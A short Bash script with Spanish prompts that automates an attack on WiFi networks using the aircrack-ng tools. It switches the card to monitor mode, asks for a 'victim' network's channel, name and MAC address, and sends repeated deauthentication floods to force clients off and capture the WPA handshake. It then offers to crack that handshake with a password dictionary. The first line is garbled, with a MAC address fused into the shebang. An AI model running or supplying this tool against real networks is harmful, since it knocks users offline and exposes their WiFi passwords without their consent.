# E8:ED:05:BA:1B:D0!/bin/bash
clear

read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision

firstTerminal(){
  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $name wlan0mon &
}

deauthentication(){
  read -p "¿Quieres enviar otro ataque de desautenticación? (si / no)" deauth
  case $deauth in
    si)
      sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
      deauthentication
      ;;
    no)
      dictionariOrSave
esac
}

dictionariOrSave(){
  read -p "¿Quieres intentar decifrar con un diccionario o guardar el handshake? [ D(diccionario) / G(guardar) ] " doc
  case $doc in
    D)
      read -p "Escribe la ruta del diccionario: " diccionario
      xterm -hold -e sudo aircrack-ng "$name"'-01.cap' -w "$diccionario" &
      sudo service NetworkManager start
      sudo airmon-ng stop wlan0mon
      exit
     ;;
    G)
      echo "Saliendo..."
      sleep 2s
      sudo service NetworkManager start
      sudo airmon-ng stop wlan0mon
      exit
  esac
}

case $firstDecision in
  si)
    echo "Comenzando..."
    echo "Matando procesos que pueden interferir..."
    sudo airmon-ng check kill
    echo "Poniendo interfaz en modo monitor..."
    sudo airmon-ng start wlan0
    echo "Escaneando redes..."
    echo "Puedes detener el escaneo cuando quieras con ctrl +c"
    sleep 5s
    sudo airodump-ng wlan0mon 
    read -p "Canal de la victima: " canal
    read -p "Nombre de la red: " red
    read -p "Direccion MAC: " mac 
    read -p "Nombre del archivo resultante: " name
    firstTerminal 
    sleep 5s 
    sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
    deauthentication
    ;;
  no)
    echo "Saliendo del script."
    exit
esac
